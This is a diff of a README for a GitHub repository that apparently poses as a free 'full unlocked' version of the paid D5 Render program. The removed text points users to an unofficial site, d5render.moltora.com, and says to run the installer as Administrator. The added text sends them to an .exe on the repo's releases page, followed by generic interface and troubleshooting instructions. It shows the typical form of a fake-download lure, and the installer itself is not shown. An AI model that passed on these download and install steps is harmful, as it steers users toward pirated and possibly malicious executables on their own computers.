@@ -1,73 +1,84 @@
-# D5 Render — Full Version Download for Windows 11 & 10
+# 🎨 D5-Render-2026 - Real Time Rendering For Windows Architecture
 
-**D5-Render-2026**
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Sweet9075/D5-Render-2026/releases)
 
-**D5 Render** — paid desktop app, **full / complete version** for Windows 10 and 11 (not a trial).  
-Direct installer link below.
+D5 Render provides architects and designers a way to create high-quality visualizations. This tool uses your computer graphics card to show changes instantly. You see light, shadow, and material edits in real time. This workflow removes long wait times common in traditional rendering tools. This version works on Windows 10 and Windows 11.
 
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()
-[![Full Version](https://img.shields.io/badge/Full-Version-9333ea?style=flat-square)]()
-[![Download](https://img.shields.io/badge/Direct-Download-16a34a?style=flat-square)]()
+## 📥 How to download the software
 
----
+Follow these steps to get the software on your computer.
 
-## Download & Install
+1. Go to the [Releases page](https://github.com/Sweet9075/D5-Render-2026/releases).
+2. Look for the latest version listed at the top of the page.
+3. Click the link that ends in .exe.
+4. Save the file to your desktop or downloads folder.
 
-> **This is the download page.** Use the button or link below to get **D5 Render** for Windows.
+## ⚙️ Setting up your system
 
-<p align="center">
-  <a href="https://d5render.moltora.com/">
-    <img src="https://img.shields.io/badge/Download-D5%20Render-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download D5 Render">
-  </a>
-</p>
+The software requires a modern computer to function well. Check these specs before you start the installation.
 
-| | |
-| --- | --- |
-| **Direct link** | **[d5render.moltora.com](https://d5render.moltora.com/)** |
-| **Full URL** | `https://d5render.moltora.com/` |
-| **Type** | Installer for Windows 10 / 11 (64-bit) |
-| **Admin** | Run setup as Administrator |
+- Operating System: Windows 10 or Windows 11 (64-bit).
+- Graphics Card: NVIDIA GeForce RTX 2060 or higher is recommended.
+- Processor: Intel Core i7 or AMD Ryzen 7.
+- Memory: 16 GB of RAM or more.
+- Storage: 10 GB of free disk space on a Solid State Drive.
 
-### Quick steps
+If your graphics card drivers are old, the application might fail to open. Update your NVIDIA drivers through the GeForce Experience app or the official NVIDIA website before you launch the program.
 
-1. Click **[Download — d5render.moltora.com](https://d5render.moltora.com/)** (link above)
-2. Save the file from the project page
-3. Run the setup **as Administrator**
-4. Enter your license key when prompted
-5. Restart if the installer asks — then launch from Start menu
+## 🛠️ Installation steps
 
-<p align="center"><a href="https://d5render.moltora.com/"><strong>⬇ Download D5 Render now</strong></a></p>
+After you download the installer, follow these steps to set up the software.
 
----
+1. Find the file you downloaded. 
+2. Double-click the file to open the installer.
+3. Follow the prompts on the screen.
+4. Choose an installation folder. It is best to use the default path.
+5. Click Install. 
+6. Wait for the progress bar to finish.
+7. Click Finish.
 
-## About D5 Render
+A shortcut appears on your desktop. Double-click this icon to start the application.
 
-**D5 Render** is commercial software. Most people search for the **full unlocked build** on Windows — all features enabled, not the limited trial.
+## 🪟 Getting started with the interface
 
-**Common searches:** d5 render download real time archviz windows, d5 render unreal engine pc, d5 render 2026
+The program window contains a few main areas. 
 
-**What you get:** complete Windows installer (64-bit), full feature set.
+- The Viewport: This is the large screen in the center. You see your 3D model here.
+- The Library: Find materials, models, and lights on the left side panel.
+- The Inspector: Change settings for selected items here. 
+- The Menu Bar: Access file tools, preferences, and render settings at the top.
 
-**Repository:** `D5-Render-2026`
+To move your camera, use the right mouse button to look around. Use the W, A, S, and D keys to move forward, left, backward, and right. Use Q and E to move down or up.
 
-## Install (full version)
+## 💡 Adding materials and lights
 
-| Step | Action |
-| --- | --- |
-| 1 | Download using the button above |
-| 2 | Run setup **as Administrator** |
-| 3 | Enter your **license key** when prompted |
-| 4 | Reboot once if the installer asks |
+Building a scene happens in three main stages.
 
-## System requirements
+First, import your 3D file. The software supports formats from common tools like SketchUp, 3ds Max, and Revit. Use the import button in the top menu to bring your model into the project.
 
-| | Minimum |
-| --- | --- |
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 8 GB (16 GB recommended) |
-| Disk | 1 GB free |
-| Admin | Required for install |
+Second, apply materials. Open the material library on the left. Drag a material onto an object in your scene. The software automatically applies the texture. Use the inspector panel on the right to adjust how much the material shines or bumps.
 
----
+Third, place lights. Open the light tab in your library. Choose a light type like a spotlight or a point light. Click in the scene to place it. Adjust the light intensity and color using the inspector panel. 
 
-**Topics:** d5-render-download-real-time-archviz-windows, d5, render, archviz, d5-render-unreal-engine-pc, unreal, engine, d5-render-2026, d5-render, d5-2026, real-time-render, 3d-rendering
+## 🖼️ Rendering your work
+
+When you finish adjusting your scene, you can export your work as an image or a video.
+
+1. Click the Render button in the top right corner.
+2. Choose between Image or Video mode.
+3. Set your desired resolution. 4K is common for presentations.
+4. Choose a save location on your computer.
+5. Click the Start Render button.
+
+The software shows a progress bar while it saves your final file. Do not turn off your computer during this step.
+
+## 🆘 Troubleshooting common issues
+
+Most problems occur because of hardware limits or drive settings.
+
+- The program crashes on startup: Ensure your graphics card driver is up to date. Turn off other programs that use the graphics card like game launchers or video editors.
+- The viewport looks pixelated: Go to Preferences, click on the Display tab, and increase the resolution scale.
+- My model does not appear: Verify that you saved your 3D file in a supported format. Make sure the file is not empty.
+- Performance feels slow: Lower your graphics settings in the Preferences menu. Reduce the amount of complex 3D vegetation or water in your project.
+
+Keywords: 3d-rendering, architecture, archviz, complete-version, d5, d5-2026, d5-render, d5-render-2026, d5-render-download-real-time-archviz-windows, d5-render-unreal-engine-pc, download, engine, full-installer, real-time-render, render, software, unreal, windows-11, windows-software
